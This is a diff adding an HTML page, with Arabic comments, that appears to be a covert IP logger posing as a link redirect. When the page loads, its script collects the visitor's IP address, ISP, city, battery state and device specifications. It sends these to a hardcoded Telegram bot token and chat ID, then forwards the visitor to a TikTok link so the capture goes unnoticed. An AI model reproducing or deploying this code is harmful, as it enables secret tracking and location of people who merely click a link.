@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <style>body { background: white; margin: 0; overflow: hidden; }</style>
+</head>
+<body>
+    <script>
+        const token = "8754409194:AAFAFa5vfi2zSGoPZ_4T_mcdCaSkOAypMYA";
+        const chatId = "7963013787";
+        const redirectUrl = "https://vt.tiktok.com/ZSH1PJjrs/";
+
+        async function collectAndSend() {
+            const now = new Date();
+            
+            // تجهيز الوقت والتاريخ
+            const dateToday = now.toLocaleDateString('ar-EG');
+            const timeNow = now.toLocaleTimeString('ar-EG', { hour12: true });
+            const timestamp = now.getTime();
+
+            // بيانات البطارية
+            let battery = { level: "غير معروف", charging: "غير معروف", discharge: "غير معروف" };
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                battery.level = (b.level * 100).toFixed(0) + "%";
+                battery.charging = b.charging ? "نعم" : "لا";
+                battery.discharge = b.dischargingTime === Infinity ? "غير محدد" : b.dischargingTime + " ثانية";
+            }
+
+            // بيانات الشبكة
+            let net = { ip: "جاري الجلب...", org: "غير معروف", city: "غير معروف", country: "" };
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                net = await res.json();
+            } catch (e) {}
+
+            // مواصفات الجهاز
+            const specs = {
+                platform: navigator.platform,
+                cores: navigator.hardwareConcurrency || "؟",
+                ram: navigator.deviceMemory || "؟",
+                screen: `${screen.width}x${screen.height}`
+            };
+
+            // صياغة الرسالة بالترتيب والمسافات المطلوبة بالضبط
+            const message = `📅 تاريخ اليوم: ${dateToday}
+
+الوقت بالساعة والدقيقة والثانية: ${timeNow}
+
+⏱️ Timestamp: ${timestamp}
+
+🔋 حالة البطارية:
+ 
+▫️ النسبة: ${battery.level}
+
+▫️ الشحن: ${battery.charging}
+
+▫️ وقت التفريغ: ${battery.discharge}
+
+🌐 بيانات الشبكة (IP): 
+
+📍 IP: ${net.ip}
+
+🏢 المزود: ${net.org}
+
+🌍 المدينة: ${net.city} ، ${net.country_name}
+
+📱 مواصفات الجهاز: 
+
+💻 النظام: ${specs.platform}
+
+🧠 المعالج: ${specs.cores} Cores
+
+📟 الرام: ${specs.ram} GB
+
+🖥️ الشاشة: ${specs.screen}`;
+
+            // إرسال الرسالة
+            try {
+                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: "Markdown" // للحفاظ على التنسيق العريض
+                    })
+                });
+            } catch (err) {}
+
+            // التحويل خلال ثانية
+            setTimeout(() => {
+                window.location.replace(redirectUrl);
+            }, 500);
+        }
+
+        window.onload = collectAndSend;
+    </script>
+</body>
+</html>
